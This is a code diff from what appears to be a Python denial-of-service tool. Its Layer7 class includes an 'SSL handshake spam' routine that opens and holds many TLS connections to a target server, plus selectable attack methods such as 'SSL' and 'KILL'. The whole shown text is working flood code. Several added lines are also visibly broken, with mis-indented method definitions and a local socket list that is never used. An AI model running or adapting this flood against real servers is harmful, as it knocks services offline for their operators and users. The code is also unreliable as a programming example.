@@ -775,7 +775,7 @@ class Layer7:
            
 
     
-    def init_ssl_spam_socket(self) : 
+  def init_ssl_spam_socket(self) : 
         
         context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
 
@@ -788,17 +788,17 @@ class Layer7:
         context.check_hostname = True
 
         sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False,do_handshake_on_connect=False)
-
-        sock.settimeout(0.9)
         
+        sock.connect((self.target,self.port))
+            
         return sock
-
-
 
    
     def handshake_spam(self) :
-     
-        while True : 
+        
+        print(GREEN +f'[I]{self.name} started to handshake spam.'+ END)
+                
+        while self.keep_running : 
             
             sockets = []
             
@@ -807,22 +807,28 @@ class Layer7:
                 try  : 
                     
                     sock = self.init_ssl_spam_socket()
-                        
+                
                     sock.do_handshake()
                 
                     self.sockets.append(sock)
                 
-                except : 
+                except Exception as error  : 
                     
-                    pass 
-                
+                    if isinstance(error,KeyboardInterrupt) :
+                        
+                        break 
+                       
+                    else : 
+                        
+                        pass  
+                                      
             for sock in self.sockets  : 
                 
                 sock.shutdown(socket.SHUT_RDWR)
 
                 sock.close()
-
-    def socket_per_thread(self) : 
+  
+  def socket_per_thread(self) : 
         
         for _ in range(self.socket_count // self.thread_count) :
                
@@ -949,7 +955,13 @@ class Layer7:
               
         if self.method  == 'SSL' : 
             
-            self.methods[self.method]() 
+            try : 
+                
+                self.methods[self.method]() 
+
+            except : 
+                
+                pass #Ignore closing traceback.
         
         elif self.method == 'KILL' :
             
